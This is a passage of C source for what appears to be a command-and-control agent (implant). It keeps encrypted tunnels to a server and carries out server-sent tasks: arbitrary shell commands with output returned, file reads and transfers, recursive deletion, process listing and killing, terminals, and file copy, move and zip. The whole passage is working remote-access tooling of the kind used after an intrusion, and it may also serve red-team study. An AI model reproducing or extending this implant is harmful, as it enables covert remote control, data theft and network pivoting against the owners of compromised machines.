        uint8_t *banner = malloc((size_t)tctx->banner_size);
        if (!banner || net_recv_exact(sock_fd, banner, (size_t)tctx->banner_size) < 0) {
            free(banner); net_close(sock_fd);
            if (active) net_close(client_fd);
            goto tun_cleanup;
        }
        free(banner);
    }

    // generate AES-CTR key+iv
    uint8_t tun_key[16], tun_iv[16];
    crypt_random(tun_key, 16);
    crypt_random(tun_iv, 16);

    // send TunnelPack init
    {
        uint8_t *tp = NULL; size_t tp_len = 0;
        pack_encode_tunnel_pack(tctx->agent_id, tctx->profile_type, tctx->entry->channel_id,
                                tun_key, tun_iv, active, reason, &tp, &tp_len);
        uint8_t *sm = NULL; size_t sm_len = 0;
        StartMsg smsg = { .type = TUNNEL_PACK, .data = tp, .data_len = tp_len };
        pack_encode_start_msg(&smsg, &sm, &sm_len);
        free(tp);
        uint8_t *enc = NULL; size_t enc_len = 0;
        crypt_encrypt(sm, sm_len, tctx->enc_key, 16, &enc, &enc_len);
        free(sm);
        net_send_msg(sock_fd, enc, (uint32_t)enc_len);
        free(enc);
    }

    if (!active) {
        net_close(sock_fd);
        goto tun_cleanup;
    }

    // set up AES-CTR stream ciphers (same key+iv, independent counter state per direction)
    {
        EVP_CIPHER_CTX *enc_ctx = EVP_CIPHER_CTX_new();
        EVP_CIPHER_CTX *dec_ctx = EVP_CIPHER_CTX_new();
        EVP_EncryptInit_ex(enc_ctx, EVP_aes_128_ctr(), NULL, tun_key, tun_iv);
        EVP_EncryptInit_ex(dec_ctx, EVP_aes_128_ctr(), NULL, tun_key, tun_iv);

        TunnelRelayCtx r_s2c = { .src_fd = sock_fd, .dst_fd = client_fd, .ctx = dec_ctx, .canceled = &entry->canceled, .paused = NULL };
        TunnelRelayCtx r_c2s = { .src_fd = client_fd, .dst_fd = sock_fd, .ctx = enc_ctx, .canceled = &entry->canceled, .paused = &entry->paused };

        pthread_t t_s2c, t_c2s;
        pthread_create(&t_s2c, NULL, tunnel_relay_srv_to_client, &r_s2c);
        pthread_create(&t_c2s, NULL, tunnel_relay_client_to_srv, &r_c2s);

        pthread_join(t_s2c, NULL);
        pthread_join(t_c2s, NULL);

        net_close(client_fd);
        net_close(sock_fd);

        EVP_CIPHER_CTX_free(enc_ctx);
        EVP_CIPHER_CTX_free(dec_ctx);
    }

tun_cleanup:
    tunnel_remove(tctx->entry->channel_id);
    free(tctx->address);
    free(tctx->srv_address);
    free(tctx);
    return NULL;
}

// ---------------------------------------------------------------------------
// param decoders
// ---------------------------------------------------------------------------

// decode {path: str}
static char *decode_path_param(const uint8_t *data, size_t len) {
    mpack_tree_t tree;
    mpack_tree_init_data(&tree, (const char *)data, len);
    mpack_tree_parse(&tree);
    mpack_node_t root = mpack_tree_root(&tree);

    mpack_node_t n = mpack_node_map_cstr(root, "path");
    size_t slen = mpack_node_strlen(n);
    const char *s = mpack_node_str(n);
    char *path = NULL;
    if (s && slen > 0) {
        path = malloc(slen + 1);
        memcpy(path, s, slen);
        path[slen] = '\0';
    }

    mpack_tree_destroy(&tree);
    return path;
}

// decode {program: str, args: [str]}
static int decode_shell_params(const uint8_t *data, size_t len,
                               char **program, char ***args, size_t *argc) {
    mpack_tree_t tree;
    mpack_tree_init_data(&tree, (const char *)data, len);
    mpack_tree_parse(&tree);
    mpack_node_t root = mpack_tree_root(&tree);

    mpack_node_t prog_node = mpack_node_map_cstr(root, "program");
    size_t plen = mpack_node_strlen(prog_node);
    const char *ps = mpack_node_str(prog_node);
    *program = malloc(plen + 1);
    memcpy(*program, ps, plen);
    (*program)[plen] = '\0';

    mpack_node_t args_node = mpack_node_map_cstr(root, "args");
    *argc = mpack_node_array_length(args_node);
    *args = calloc(*argc, sizeof(char *));
    for (size_t i = 0; i < *argc; i++) {
        mpack_node_t a = mpack_node_array_at(args_node, i);
        size_t alen = mpack_node_strlen(a);
        const char *as = mpack_node_str(a);
        (*args)[i] = malloc(alen + 1);
        memcpy((*args)[i], as, alen);
        (*args)[i][alen] = '\0';
    }

    mpack_error_t err = mpack_tree_destroy(&tree);
    return (err == mpack_ok) ? 0 : -1;
}

// decode {src: str, dst: str}
static int decode_src_dst_params(const uint8_t *data, size_t len,
                                 char **src, char **dst) {
    mpack_tree_t tree;
    mpack_tree_init_data(&tree, (const char *)data, len);
    mpack_tree_parse(&tree);
    mpack_node_t root = mpack_tree_root(&tree);

    mpack_node_t sn = mpack_node_map_cstr(root, "src");
    size_t slen = mpack_node_strlen(sn);
    const char *ss = mpack_node_str(sn);
    *src = malloc(slen + 1);
    memcpy(*src, ss, slen);
    (*src)[slen] = '\0';

    mpack_node_t dn = mpack_node_map_cstr(root, "dst");
    size_t dlen = mpack_node_strlen(dn);
    const char *ds = mpack_node_str(dn);
    *dst = malloc(dlen + 1);
    memcpy(*dst, ds, dlen);
    (*dst)[dlen] = '\0';

    mpack_error_t err = mpack_tree_destroy(&tree);
    return (err == mpack_ok) ? 0 : -1;
}

// decode {path: str, content: bin, finish: bool}
static int decode_upload_params(const uint8_t *data, size_t len,
                                char **path, uint8_t **content, size_t *content_len,
                                bool *finish) {
    mpack_tree_t tree;
    mpack_tree_init_data(&tree, (const char *)data, len);
    mpack_tree_parse(&tree);
    mpack_node_t root = mpack_tree_root(&tree);

    mpack_node_t pn = mpack_node_map_cstr(root, "path");
    size_t plen = mpack_node_strlen(pn);
    const char *ps = mpack_node_str(pn);
    *path = malloc(plen + 1);
    memcpy(*path, ps, plen);
    (*path)[plen] = '\0';

    mpack_node_t cn = mpack_node_map_cstr(root, "content");
    *content_len = mpack_node_bin_size(cn);
    const char *cd = mpack_node_bin_data(cn);
    if (cd && *content_len > 0) {
        *content = malloc(*content_len);
        memcpy(*content, cd, *content_len);
    } else {
        *content = NULL;
        *content_len = 0;
    }

    *finish = mpack_node_bool(mpack_node_map_cstr(root, "finish"));

    mpack_error_t err = mpack_tree_destroy(&tree);
    return (err == mpack_ok) ? 0 : -1;
}

// decode {task: str, path: str}
static int decode_download_params(const uint8_t *data, size_t len,
                                  char **task, char **path) {
    mpack_tree_t tree;
    mpack_tree_init_data(&tree, (const char *)data, len);
    mpack_tree_parse(&tree);
    mpack_node_t root = mpack_tree_root(&tree);

    mpack_node_t tn = mpack_node_map_cstr(root, "task");
    size_t tlen = mpack_node_strlen(tn);
    const char *ts = mpack_node_str(tn);
    *task = malloc(tlen + 1);
    memcpy(*task, ts, tlen);
    (*task)[tlen] = '\0';

    mpack_node_t pn = mpack_node_map_cstr(root, "path");
    size_t plen = mpack_node_strlen(pn);
    const char *ps = mpack_node_str(pn);
    *path = malloc(plen + 1);
    memcpy(*path, ps, plen);
    (*path)[plen] = '\0';

    mpack_error_t err = mpack_tree_destroy(&tree);
    return (err == mpack_ok) ? 0 : -1;
}

// decode {program: str, args: [str], task: str} (run command)
static int decode_run_params(const uint8_t *data, size_t len,
                             char **program, char ***args, size_t *argc, char **task) {
    mpack_tree_t tree;
    mpack_tree_init_data(&tree, (const char *)data, len);
    mpack_tree_parse(&tree);
    mpack_node_t root = mpack_tree_root(&tree);

    mpack_node_t prog_node = mpack_node_map_cstr(root, "program");
    size_t plen = mpack_node_strlen(prog_node);
    const char *ps = mpack_node_str(prog_node);
    *program = malloc(plen + 1);
    memcpy(*program, ps, plen);
    (*program)[plen] = '\0';

    mpack_node_t args_node = mpack_node_map_cstr(root, "args");
    *argc = mpack_node_array_length(args_node);
    *args = calloc(*argc, sizeof(char *));
    for (size_t i = 0; i < *argc; i++) {
        mpack_node_t a = mpack_node_array_at(args_node, i);
        size_t alen = mpack_node_strlen(a);
        const char *as = mpack_node_str(a);
        (*args)[i] = malloc(alen + 1);
        memcpy((*args)[i], as, alen);
        (*args)[i][alen] = '\0';
    }

    mpack_node_t task_node = mpack_node_map_cstr(root, "task");
    size_t tlen = mpack_node_strlen(task_node);
    const char *ts = mpack_node_str(task_node);
    *task = malloc(tlen + 1);
    memcpy(*task, ts, tlen);
    (*task)[tlen] = '\0';

    mpack_error_t err = mpack_tree_destroy(&tree);
    return (err == mpack_ok) ? 0 : -1;
}

// decode {id: str} (job kill)
static int decode_job_kill_params(const uint8_t *data, size_t len, char **id) {
    mpack_tree_t tree;
    mpack_tree_init_data(&tree, (const char *)data, len);
    mpack_tree_parse(&tree);
    mpack_node_t root = mpack_tree_root(&tree);

    mpack_node_t n = mpack_node_map_cstr(root, "id");
    size_t slen = mpack_node_strlen(n);
    const char *s = mpack_node_str(n);
    *id = malloc(slen + 1);
    memcpy(*id, s, slen);
    (*id)[slen] = '\0';

    mpack_error_t err = mpack_tree_destroy(&tree);
    return (err == mpack_ok) ? 0 : -1;
}

// decode {term_id: int, program: str, height: int, width: int}
static int decode_terminal_start_params(const uint8_t *data, size_t len,
                                        int *term_id, char **program,
                                        int *height, int *width) {
    mpack_tree_t tree;
    mpack_tree_init_data(&tree, (const char *)data, len);
    mpack_tree_parse(&tree);
    mpack_node_t root = mpack_tree_root(&tree);

    *term_id = mpack_node_i32(mpack_node_map_cstr(root, "term_id"));
    *height = mpack_node_i32(mpack_node_map_cstr(root, "height"));
    *width = mpack_node_i32(mpack_node_map_cstr(root, "width"));

    mpack_node_t prog_node = mpack_node_map_cstr(root, "program");
    size_t plen = mpack_node_strlen(prog_node);
    const char *ps = mpack_node_str(prog_node);
    *program = malloc(plen + 1);
    memcpy(*program, ps, plen);
    (*program)[plen] = '\0';

    mpack_error_t err = mpack_tree_destroy(&tree);
    return (err == mpack_ok) ? 0 : -1;
}

// decode {term_id: int}
static int decode_terminal_stop_params(const uint8_t *data, size_t len, int *term_id) {
    mpack_tree_t tree;
    mpack_tree_init_data(&tree, (const char *)data, len);
    mpack_tree_parse(&tree);
    mpack_node_t root = mpack_tree_root(&tree);

    *term_id = mpack_node_i32(mpack_node_map_cstr(root, "term_id"));

    mpack_error_t err = mpack_tree_destroy(&tree);
    return (err == mpack_ok) ? 0 : -1;
}

// decode {proto: str, channel_id: int, address: str}
static int decode_tunnel_start_params(const uint8_t *data, size_t len,
                                      int *channel_id, char **address) {
    mpack_tree_t tree;
    mpack_tree_init_data(&tree, (const char *)data, len);
    mpack_tree_parse(&tree);
    mpack_node_t root = mpack_tree_root(&tree);

    *channel_id = mpack_node_i32(mpack_node_map_cstr(root, "channel_id"));

    mpack_node_t addr_n = mpack_node_map_cstr(root, "address");
    size_t addr_len = mpack_node_strlen(addr_n);
    const char *addr_s = mpack_node_str(addr_n);
    *address = NULL;
    if (addr_s && addr_len > 0) {
        *address = malloc(addr_len + 1);
        memcpy(*address, addr_s, addr_len);
        (*address)[addr_len] = '\0';
    }

    mpack_error_t err2 = mpack_tree_destroy(&tree);
    return (err2 == mpack_ok && *address) ? 0 : -1;
}

// decode {channel_id: int}
static int decode_tunnel_channel_param(const uint8_t *data, size_t len, int *channel_id) {
    mpack_tree_t tree;
    mpack_tree_init_data(&tree, (const char *)data, len);
    mpack_tree_parse(&tree);
    mpack_node_t root = mpack_tree_root(&tree);

    *channel_id = mpack_node_i32(mpack_node_map_cstr(root, "channel_id"));

    mpack_error_t err2 = mpack_tree_destroy(&tree);
    return (err2 == mpack_ok) ? 0 : -1;
}

// decode {pid: int}
static int decode_kill_params(const uint8_t *data, size_t len, int *pid) {
    mpack_tree_t tree;
    mpack_tree_init_data(&tree, (const char *)data, len);
    mpack_tree_parse(&tree);
    mpack_node_t root = mpack_tree_root(&tree);

    *pid = mpack_node_i32(mpack_node_map_cstr(root, "pid"));

    mpack_error_t err = mpack_tree_destroy(&tree);
    return (err == mpack_ok) ? 0 : -1;
}

// ---------------------------------------------------------------------------
// mode string
// ---------------------------------------------------------------------------

static void mode_string(mode_t m, bool is_link, char *buf) {
    int w = 0;
    if (S_ISDIR(m))                    buf[w++] = 'd';
    if (is_link)                       buf[w++] = 'L';
    if (S_ISBLK(m) || S_ISCHR(m))     buf[w++] = 'D';
    if (S_ISFIFO(m))                   buf[w++] = 'p';
    if (S_ISSOCK(m))                   buf[w++] = 'S';
    if (m & S_ISUID)                   buf[w++] = 'u';
    if (m & S_ISGID)                   buf[w++] = 'g';
    if (S_ISCHR(m))                    buf[w++] = 'c';
    if (m & S_ISVTX)                   buf[w++] = 't';
    if (w == 0)                        buf[w++] = '-';

    buf[w++] = (m & S_IRUSR) ? 'r' : '-';
    buf[w++] = (m & S_IWUSR) ? 'w' : '-';
    buf[w++] = (m & S_IXUSR) ? 'x' : '-';
    buf[w++] = (m & S_IRGRP) ? 'r' : '-';
    buf[w++] = (m & S_IWGRP) ? 'w' : '-';
    buf[w++] = (m & S_IXGRP) ? 'x' : '-';
    buf[w++] = (m & S_IROTH) ? 'r' : '-';
    buf[w++] = (m & S_IWOTH) ? 'w' : '-';
    buf[w++] = (m & S_IXOTH) ? 'x' : '-';
    buf[w] = '\0';
}

// ---------------------------------------------------------------------------
// FileInfo inner array encoder
// ---------------------------------------------------------------------------

typedef struct {
    char    *mode;
    int      nlink;
    char    *user;
    char    *group;
    int64_t  size;
    char    *date;
    char    *filename;
    bool     is_dir;
} FileInfo;

static void fileinfo_free(FileInfo *fi) {
    free(fi->mode);
    free(fi->user);
    free(fi->group);
    free(fi->date);
    free(fi->filename);
}

static int encode_file_info_array(FileInfo *files, size_t count,
                                  uint8_t **out, size_t *out_len) {
    char *buf = NULL;
    size_t sz = 0;
    mpack_writer_t w;
    mpack_writer_init_growable(&w, &buf, &sz);

    mpack_start_array(&w, (uint32_t)count);
    for (size_t i = 0; i < count; i++) {
        mpack_start_map(&w, 8);
        mpack_write_cstr(&w, "mode");     mpack_write_cstr(&w, files[i].mode ? files[i].mode : "");
        mpack_write_cstr(&w, "nlink");    mpack_write_i32(&w, files[i].nlink);
        mpack_write_cstr(&w, "user");     mpack_write_cstr(&w, files[i].user ? files[i].user : "");
        mpack_write_cstr(&w, "group");    mpack_write_cstr(&w, files[i].group ? files[i].group : "");
        mpack_write_cstr(&w, "size");     mpack_write_i64(&w, files[i].size);
        mpack_write_cstr(&w, "date");     mpack_write_cstr(&w, files[i].date ? files[i].date : "");
        mpack_write_cstr(&w, "filename"); mpack_write_cstr(&w, files[i].filename ? files[i].filename : "");
        mpack_write_cstr(&w, "is_dir");   mpack_write_bool(&w, files[i].is_dir);
        mpack_finish_map(&w);
    }
    mpack_finish_array(&w);

    mpack_error_t err = mpack_writer_destroy(&w);
    if (err != mpack_ok) { free(buf); return -1; }
    *out = (uint8_t *)buf;
    *out_len = sz;
    return 0;
}

// ---------------------------------------------------------------------------
// PsInfo inner array encoder
// ---------------------------------------------------------------------------

typedef struct {
    int   pid;
    int   ppid;
    char *tty;
    char *context;
    char *process;
} PsInfo;

static void psinfo_free(PsInfo *pi) {
    free(pi->tty);
    free(pi->context);
    free(pi->process);
}

static int encode_ps_info_array(PsInfo *procs, size_t count,
                                uint8_t **out, size_t *out_len) {
    char *buf = NULL;
    size_t sz = 0;
    mpack_writer_t w;
    mpack_writer_init_growable(&w, &buf, &sz);

    mpack_start_array(&w, (uint32_t)count);
    for (size_t i = 0; i < count; i++) {
        mpack_start_map(&w, 5);
        mpack_write_cstr(&w, "pid");     mpack_write_i32(&w, procs[i].pid);
        mpack_write_cstr(&w, "ppid");    mpack_write_i32(&w, procs[i].ppid);
        mpack_write_cstr(&w, "tty");     mpack_write_cstr(&w, procs[i].tty ? procs[i].tty : "");
        mpack_write_cstr(&w, "context"); mpack_write_cstr(&w, procs[i].context ? procs[i].context : "");
        mpack_write_cstr(&w, "process"); mpack_write_cstr(&w, procs[i].process ? procs[i].process : "");
        mpack_finish_map(&w);
    }
    mpack_finish_array(&w);

    mpack_error_t err = mpack_writer_destroy(&w);
    if (err != mpack_ok) { free(buf); return -1; }
    *out = (uint8_t *)buf;
    *out_len = sz;
    return 0;
}

// ---------------------------------------------------------------------------
// buildFileInfo
// ---------------------------------------------------------------------------

static FileInfo build_file_info(const char *path, struct stat *lst, const char *display_name) {
    FileInfo fi = {0};

    bool is_link = S_ISLNK(lst->st_mode);
    bool is_dir  = S_ISDIR(lst->st_mode);
    if (is_link) {
        struct stat target;
        if (stat(path, &target) == 0) is_dir = S_ISDIR(target.st_mode);
    }

    char mbuf[32];
    mode_string(lst->st_mode, is_link, mbuf);
    fi.mode = strdup(mbuf);

    fi.nlink = (int)lst->st_nlink;

    struct passwd *pw = getpwuid(lst->st_uid);
    if (pw) fi.user = strdup(pw->pw_name);
    else {
        char ubuf[16];
        snprintf(ubuf, sizeof(ubuf), "%u", lst->st_uid);
        fi.user = strdup(ubuf);
    }

    struct group *gr = getgrgid(lst->st_gid);
    if (gr) fi.group = strdup(gr->gr_name);
    else {
        char gbuf[16];
        snprintf(gbuf, sizeof(gbuf), "%u", lst->st_gid);
        fi.group = strdup(gbuf);
    }

    fi.size = (int64_t)lst->st_size;

    char dbuf[32];
    struct tm *tm = localtime(&lst->st_mtime);
    strftime(dbuf, sizeof(dbuf), "%b %e %H:%M", tm);
    fi.date = strdup(dbuf);

    fi.filename = strdup(display_name);
    fi.is_dir = is_dir;
    return fi;
}

// ---------------------------------------------------------------------------
// GetListing
// ---------------------------------------------------------------------------

static int get_listing(const char *path, FileInfo **out, size_t *count, char **err_msg) {
    *out = NULL;
    *count = 0;

    struct stat path_st;
    if (lstat(path, &path_st) != 0) {
        *err_msg = strdup(strerror(errno));
        return -1;
    }

    if (!S_ISDIR(path_st.st_mode)) {
        char *base = strrchr(path, '/');
        base = base ? base + 1 : (char *)path;
        *out = malloc(sizeof(FileInfo));
        (*out)[0] = build_file_info(path, &path_st, base);
        *count = 1;
        return 0;
    }

    DIR *d = opendir(path);
    if (!d) {
        *err_msg = strdup(strerror(errno));
        return -1;
    }

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (strcmp(ent->d_name, ".") == 0 || strcmp(ent->d_name, "..") == 0) continue;

        char fullpath[PATH_MAX];
        snprintf(fullpath, sizeof(fullpath), "%s/%s", path, ent->d_name);

        struct stat st;
        if (lstat(fullpath, &st) != 0) {
            closedir(d);
            *err_msg = strdup(strerror(errno));
            for (size_t i = 0; i < *count; i++) fileinfo_free(&(*out)[i]);
            free(*out);
            *out = NULL;
            *count = 0;
            return -1;
        }

        *out = realloc(*out, (*count + 1) * sizeof(FileInfo));
        (*out)[*count] = build_file_info(fullpath, &st, ent->d_name);
        (*count)++;
    }
    closedir(d);
    return 0;
}

// ---------------------------------------------------------------------------
// GetProcesses
// ---------------------------------------------------------------------------

static int get_processes(PsInfo **out, size_t *count) {
    *out = NULL;
    *count = 0;

    DIR *d = opendir("/proc");
    if (!d) return -1;

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        char *endp;
        long pid = strtol(ent->d_name, &endp, 10);
        if (*endp != '\0' || pid <= 0) continue;

        PsInfo info = {0};
        info.pid = (int)pid;
        char ppath[256];

        // ppid from /proc/<pid>/stat
        snprintf(ppath, sizeof(ppath), "/proc/%ld/stat", pid);
        FILE *f = fopen(ppath, "r");
        if (f) {
            char buf[4096];
            if (fgets(buf, sizeof(buf), f)) {
                char *cp = strrchr(buf, ')');
                if (cp) {
                    int ppid = 0;
                    sscanf(cp + 2, "%*c %d", &ppid);
                    info.ppid = ppid;
                }
            }
            fclose(f);
        }

        // tty from /proc/<pid>/stat field 7
        snprintf(ppath, sizeof(ppath), "/proc/%ld/stat", pid);
        f = fopen(ppath, "r");
        info.tty = strdup("");
        if (f) {
            char buf[4096];
            if (fgets(buf, sizeof(buf), f)) {
                char *cp = strrchr(buf, ')');
                if (cp) {
                    int tty_nr = 0;
                    sscanf(cp + 2, "%*c %*d %*d %*d %d", &tty_nr);
                    if (tty_nr != 0) {
                        int major = (tty_nr >> 8) & 0xff;
                        int minor = tty_nr & 0xff;
                        char tbuf[32];
                        if (major == 136)     snprintf(tbuf, sizeof(tbuf), "pts/%d", minor);
                        else if (major == 4)  snprintf(tbuf, sizeof(tbuf), "tty%d", minor);
                        else                  snprintf(tbuf, sizeof(tbuf), "%d:%d", major, minor);
                        free(info.tty);
                        info.tty = strdup(tbuf);
                    }
                }
            }
            fclose(f);
        }

        // username from /proc/<pid>/status Uid line
        info.context = strdup("");
        snprintf(ppath, sizeof(ppath), "/proc/%ld/status", pid);
        f = fopen(ppath, "r");
        if (f) {
            char line[256];
            while (fgets(line, sizeof(line), f)) {
                unsigned uid;
                if (sscanf(line, "Uid:\t%u", &uid) == 1) {
                    struct passwd *pw = getpwuid(uid);
                    free(info.context);
                    info.context = strdup(pw ? pw->pw_name : "");
                    break;
                }
            }
            fclose(f);
        }

        // cmdline from /proc/<pid>/cmdline, fallback to /proc/<pid>/comm
        info.process = NULL;
        snprintf(ppath, sizeof(ppath), "/proc/%ld/cmdline", pid);
        f = fopen(ppath, "r");
        if (f) {
            char cmdline[4096];
            size_t n = fread(cmdline, 1, sizeof(cmdline) - 1, f);
            fclose(f);
            if (n > 0) {
                for (size_t j = 0; j < n - 1; j++)
                    if (cmdline[j] == '\0') cmdline[j] = ' ';
                cmdline[n] = '\0';
                info.process = strdup(cmdline);
            }
        }
        if (!info.process || info.process[0] == '\0') {
            free(info.process);
            snprintf(ppath, sizeof(ppath), "/proc/%ld/comm", pid);
            f = fopen(ppath, "r");
            if (f) {
                char comm[256];
                if (fgets(comm, sizeof(comm), f)) {
                    comm[strcspn(comm, "\n")] = '\0';
                    info.process = strdup(comm);
                } else {
                    info.process = strdup("");
                }
                fclose(f);
            } else {
                info.process = strdup("");
            }
        }

        *out = realloc(*out, (*count + 1) * sizeof(PsInfo));
        (*out)[*count] = info;
        (*count)++;
    }

    closedir(d);
    return 0;
}

// ---------------------------------------------------------------------------
// task functions
// Each returns NULL on success (result via out params), or strdup'd error msg.
// ---------------------------------------------------------------------------

static char *task_pwd(uint8_t **out, size_t *out_len) {
    char cwd[PATH_MAX];
    if (!getcwd(cwd, sizeof(cwd))) return strdup(strerror(errno));
    if (pack_encode_pwd(cwd, out, out_len) < 0) return strdup("encode error");
    return NULL;
}

static char *task_cd(const uint8_t *params, size_t params_len,
                     uint8_t **out, size_t *out_len) {
    char *raw = decode_path_param(params, params_len);
    if (!raw) return strdup("invalid params");

    char *path = normalize_path(raw);
    free(raw);
    if (!path) return strdup("invalid path");

    if (chdir(path) != 0) {
        char *e = strdup(strerror(errno));
        free(path);
        return e;
    }
    free(path);

    char cwd[PATH_MAX];
    if (!getcwd(cwd, sizeof(cwd))) return strdup(strerror(errno));
    if (pack_encode_pwd(cwd, out, out_len) < 0) return strdup("encode error");
    return NULL;
}

static char *task_shell(const uint8_t *params, size_t params_len,
                        uint8_t **out, size_t *out_len) {
    char *program = NULL;
    char **args = NULL;
    size_t argc = 0;

    if (decode_shell_params(params, params_len, &program, &args, &argc) < 0)
        return strdup("invalid params");

    // argv: [program, args..., NULL]
    char **argv = calloc(argc + 2, sizeof(char *));
    argv[0] = program;
    for (size_t i = 0; i < argc; i++) argv[i + 1] = args[i];
    argv[argc + 1] = NULL;

    int pipefd[2];
    if (pipe(pipefd) < 0) {
        char *e = strdup(strerror(errno));
        free(argv); free(program);
        for (size_t i = 0; i < argc; i++) free(args[i]);
        free(args);
        return e;
    }

    pid_t pid = fork();
    if (pid < 0) {
        char *e = strdup(strerror(errno));
        close(pipefd[0]); close(pipefd[1]);
        free(argv); free(program);
        for (size_t i = 0; i < argc; i++) free(args[i]);
        free(args);
        return e;
    }

    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);
        close(pipefd[1]);
        execvp(program, argv);
        _exit(127);
    }

    close(pipefd[1]);

    size_t cap = 4096, total = 0;
    char *output = malloc(cap);
    ssize_t n;
    while ((n = read(pipefd[0], output + total, cap - total)) > 0) {
        total += (size_t)n;
        if (total >= cap) { cap *= 2; output = realloc(output, cap); }
    }
    close(pipefd[0]);
    output[total] = '\0';

    waitpid(pid, NULL, 0);

    // Go ignores CombinedOutput error, so we always encode the output
    int rc = pack_encode_shell(output, out, out_len);

    free(output); free(argv); free(program);
    for (size_t i = 0; i < argc; i++) free(args[i]);
    free(args);
    return (rc == 0) ? NULL : strdup("encode error");
}

static char *task_cat(const uint8_t *params, size_t params_len,
                      uint8_t **out, size_t *out_len) {
    char *raw = decode_path_param(params, params_len);
    if (!raw) return strdup("invalid params");

    char *path = normalize_path(raw);
    if (!path) { free(raw); return strdup("invalid path"); }

    struct stat st;
    if (stat(path, &st) != 0) {
        char *e = strdup(strerror(errno));
        free(raw); free(path);
        return e;
    }

    if (st.st_size > 0x100000) {
        free(raw); free(path);
        return strdup("file size exceeds 1 Mb (use download)");
    }

    FILE *f = fopen(path, "rb");
    if (!f) {
        char *e = strdup(strerror(errno));
        free(raw); free(path);
        return e;
    }

    uint8_t *content = malloc((size_t)st.st_size);
    size_t rd = fread(content, 1, (size_t)st.st_size, f);
    fclose(f);
    free(path);

    // Go uses params.Path (original, not normalized) in response
    int rc = pack_encode_cat(raw, content, rd, out, out_len);
    free(content);
    free(raw);
    return (rc == 0) ? NULL : strdup("encode error");
}

static char *task_mkdir(const uint8_t *params, size_t params_len) {
    char *raw = decode_path_param(params, params_len);
    if (!raw) return strdup("invalid params");

    char *path = normalize_path(raw);
    free(raw);
    if (!path) return strdup("invalid path");

    int rc = mkdir_all(path, 0755);
    char *e = (rc == 0) ? NULL : strdup(strerror(errno));
    free(path);
    return e;
}

static char *task_rm(const uint8_t *params, size_t params_len) {
    char *raw = decode_path_param(params, params_len);
    if (!raw) return strdup("invalid params");

    char *path = normalize_path(raw);
    free(raw);
    if (!path) return strdup("invalid path");

    struct stat st;
    if (stat(path, &st) != 0) {
        char *e = strdup(strerror(errno));
        free(path);
        return e;
    }

    int rc;
    if (S_ISDIR(st.st_mode)) rc = rm_rf(path);
    else                      rc = remove(path);

    char *e = (rc == 0) ? NULL : strdup(strerror(errno));
    free(path);
    return e;
}

// ls: listing errors become AnsLs{Result:false}, not task errors
static char *task_ls(const uint8_t *params, size_t params_len,
                     uint8_t **out, size_t *out_len) {
    char *raw = decode_path_param(params, params_len);
    if (!raw) return strdup("invalid params");

    char *path = normalize_path(raw);
    free(raw);
    if (!path) return strdup("invalid path");

    FileInfo *files = NULL;
    size_t file_count = 0;
    char *listing_err = NULL;

    if (get_listing(path, &files, &file_count, &listing_err) < 0) {
        // listing failure: return AnsLs with Result=false (not a task error)
        int rc = pack_encode_ls(false, listing_err, path, NULL, 0, out, out_len);
        free(listing_err);
        free(path);
        return (rc == 0) ? NULL : strdup("encode error");
    }

    // encode inner FileInfo array
    uint8_t *files_data = NULL;
    size_t files_len = 0;
    encode_file_info_array(files, file_count, &files_data, &files_len);

    for (size_t i = 0; i < file_count; i++) fileinfo_free(&files[i]);
    free(files);

    int rc = pack_encode_ls(true, "", path, files_data, files_len, out, out_len);
    free(files_data);
    free(path);
    return (rc == 0) ? NULL : strdup("encode error");
}

static char *task_ps(uint8_t **out, size_t *out_len) {
    PsInfo *procs = NULL;
    size_t proc_count = 0;

    if (get_processes(&procs, &proc_count) < 0) return strdup("failed to enumerate processes");

    uint8_t *procs_data = NULL;
    size_t procs_len = 0;
    encode_ps_info_array(procs, proc_count, &procs_data, &procs_len);

    for (size_t i = 0; i < proc_count; i++) psinfo_free(&procs[i]);
    free(procs);

    int rc = pack_encode_ps(true, "", procs_data, procs_len, out, out_len);
    free(procs_data);
    return (rc == 0) ? NULL : strdup("encode error");
}

static char *task_kill(const uint8_t *params, size_t params_len) {
    int pid = 0;
    if (decode_kill_params(params, params_len, &pid) < 0) return strdup("invalid params");
    if (kill(pid, SIGKILL) != 0) return strdup(strerror(errno));
    return NULL;
}

static char *task_cp(const uint8_t *params, size_t params_len) {
    char *src_raw = NULL, *dst_raw = NULL;
    if (decode_src_dst_params(params, params_len, &src_raw, &dst_raw) < 0)
        return strdup("invalid params");

    char *src = normalize_path(src_raw);
    free(src_raw);
    if (!src) { free(dst_raw); return strdup("invalid src path"); }

    char *dst = normalize_path(dst_raw);
    free(dst_raw);
    if (!dst) { free(src); return strdup("invalid dst path"); }

    struct stat st;
    if (stat(src, &st) != 0) {
        char *e = strdup(strerror(errno));
        free(src); free(dst);
        return e;
    }

    int rc;
    if (S_ISDIR(st.st_mode)) rc = copy_dir(src, dst);
    else                      rc = copy_file(src, dst, st.st_mode);

    free(src); free(dst);
    if (rc != 0) return strdup(strerror(errno));
    return NULL;
}

static char *task_mv(const uint8_t *params, size_t params_len) {
    char *src_raw = NULL, *dst_raw = NULL;
    if (decode_src_dst_params(params, params_len, &src_raw, &dst_raw) < 0)
        return strdup("invalid params");

    char *src = normalize_path(src_raw);
    free(src_raw);
    if (!src) { free(dst_raw); return strdup("invalid src path"); }

    char *dst = normalize_path(dst_raw);
    free(dst_raw);
    if (!dst) { free(src); return strdup("invalid dst path"); }

    if (rename(src, dst) == 0) {
        free(src); free(dst);
        return NULL;
    }

    struct stat st;
    if (stat(src, &st) != 0) {
        char *e = strdup(strerror(errno));
        free(src); free(dst);
        return e;
    }

    int rc;
    if (S_ISDIR(st.st_mode)) {
        rc = copy_dir(src, dst);
        if (rc == 0) rm_rf(src);
    } else {
        rc = copy_file(src, dst, st.st_mode);
        if (rc == 0) remove(src);
    }

    free(src); free(dst);
    if (rc != 0) return strdup(strerror(errno));
    return NULL;
}

static char *task_zip(const uint8_t *params, size_t params_len,
                      uint8_t **out, size_t *out_len) {
    char *src_raw = NULL, *dst_raw = NULL;
    if (decode_src_dst_params(params, params_len, &src_raw, &dst_raw) < 0)
        return strdup("invalid params");

    char *src = normalize_path(src_raw);
    free(src_raw);
    if (!src) { free(dst_raw); return strdup("invalid src path"); }

    char *dst = normalize_path(dst_raw);
    free(dst_raw);
    if (!dst) { free(src); return strdup("invalid dst path"); }

    struct stat st;
    if (stat(src, &st) != 0) {
        char *e = strdup(strerror(errno));
